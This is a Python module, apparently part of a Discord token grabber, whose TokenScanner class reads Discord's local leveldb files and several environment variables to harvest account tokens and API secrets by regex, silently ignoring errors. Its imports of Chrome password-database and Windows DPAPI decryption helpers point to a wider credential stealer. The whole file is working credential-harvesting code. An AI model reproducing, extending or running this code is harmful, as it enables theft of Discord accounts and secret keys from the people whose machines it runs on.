import os
import re
import sqlite3
from utils.path_utils import get_chrome_password_db, get_discord_storage_paths, is_windows
from utils.crypto_utils import decrypt_windows_dpapi

class TokenScanner:
    """Scan for Discord and API tokens"""
    
    # Discord token pattern: 24.6-7.27
    DISCORD_TOKEN_PATTERN = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
    MFA_TOKEN_PATTERN = r'[\w-]{24}\.[\w-]{6}-[\w-]{27}'
    
    def scan_discord_tokens(self):
        """Scan for Discord tokens in leveldb storage"""
        tokens = []
        
        for storage_path in get_discord_storage_paths():
            if not os.path.exists(storage_path):
                continue
            
            try:
                for filename in os.listdir(storage_path):
                    if filename.endswith('.ldb'):
                        filepath = os.path.join(storage_path, filename)
                        try:
                            with open(filepath, 'rb') as f:
                                content = f.read()
                                
                                # Try to decode as UTF-8
                                try:
                                    decoded = content.decode('utf-8', errors='ignore')
                                except:
                                    continue
                                
                                # Search for token patterns
                                matches = re.findall(self.DISCORD_TOKEN_PATTERN, decoded)
                                for match in matches:
                                    if match not in tokens:
                                        tokens.append(match)
                        except Exception as e:
                            pass
            except Exception as e:
                pass
        
        return tokens
    
    def scan_environment_tokens(self):
        """Scan environment variables for tokens"""
        tokens = []
        token_env_vars = ['DISCORD_TOKEN', 'BOT_TOKEN', 'API_KEY', 'SECRET_KEY']
        
        for var in token_env_vars:
            value = os.getenv(var)
            if value and re.match(self.DISCORD_TOKEN_PATTERN, value):
                tokens.append(f"{var}={value}")
        
        return tokens
